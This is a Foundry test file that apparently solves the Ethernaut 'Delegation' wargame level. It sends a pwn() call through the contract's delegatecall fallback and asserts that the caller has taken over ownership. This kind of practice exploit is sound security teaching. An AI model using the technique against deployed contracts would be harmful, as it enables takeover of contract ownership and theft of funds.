import "forge-std/Test.sol";
import "Ethernaut/delegation.sol";

contract DelegationTest is Test {

    Delegation delegation;

    Delegate delegate;
    function setUp() public {
        delegate = new Delegate(address(0x01));
        delegation = new Delegation(address(delegate));
    }   

    function test_delegateCall() public {

        vm.startPrank(address(0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B));
        
        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        assertTrue(success, "Delegate call should succeed");
        assertEq(delegation.owner(), 0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B, "Owner should be msg.sender");
    }
}